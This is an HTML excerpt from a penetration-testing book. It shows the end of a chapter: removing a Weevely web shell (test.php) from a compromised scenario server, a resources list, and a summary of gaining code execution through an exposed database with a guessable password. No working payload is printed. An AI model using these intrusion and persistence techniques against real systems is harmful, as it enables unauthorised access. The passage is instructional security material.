ECORP-PRD-API01:C:\xampp\htdocs\xampp $<span class="strong"><strong> dir</strong></span>
[-][channel] The remote backdoor request triggers an error 404, please verify its availability
[-][channel] The remote backdoor request triggers an error 404, please verify its availability
ECORP-PRD-API01:C:\xampp\htdocs\xampp $</pre></div><p>Once we remove the <code class="literal">test.php</code> shell, the Weevely client loses connectivity, displaying the <code class="literal">404</code> error message in the preceding code block.</p><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note12"/>Note</h3><p>It is a good idea to finalize the report before destroying any persistence into the network.</p></div></div></div>
<div class="section" title="Resources"><div class="titlepage"><div><div><h1 class="title"><a id="ch03lvl1sec27"/>Resources</h1></div></div></div><p>Consult the following resources for <a id="id190" class="indexterm"/>more information on penetration testing tools and techniques:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc">Mitre provides a handy website with all the CVEs available: <a class="ulink" href="http://cve.mitre.org/">http://cve.mitre.org/</a></li><li class="listitem" style="list-style-type: disc">Weevely documentation and bleeding edge-code is available on GitHub: <a class="ulink" href="https://github.com">https://github.com</a></li></ul></div></div>
<div class="section" title="Summary"><div class="titlepage"><div><div><h1 class="title"><a id="ch03lvl1sec28"/>Summary</h1></div></div></div><p>In this chapter, we've continued to showcase how difficult it is to get security right all of the time. Unfortunately, this has been, and always will be, a reality for most companies. As professional attackers, however, we thrive on this.</p><p>In our scenario, we did not tackle the application head on, spending countless hours interacting with the API and looking for a way to compromise it. Instead, we assumed that the bulk of the security-hardening effort was spent on the application itself, and we banked on the fact that, understandably, securing a server or development environment, and keeping it secure, is a difficult task.</p><p>Often, the application development lifecycle tends to focus developers and administrators on the application code itself, while auxiliary systems controls are neglected. The operating system is not patched, the firewall is wide open, and development database instances expose the application to a slew of simple, yet effective, attacks.</p><p>In this chapter, we looked at alternate ways to compromise the target application. By scanning the application server with Nmap, we found an exposed database service that was configured with an easily guessable password. With access to the adjacent service, we were able to execute code on the server and ultimately access the target application and more.</p><p>In the next chapter, we will look at advanced brute-forcing techniques and how to fly under the radar during engagements where stealth is key.</p></div></body></html>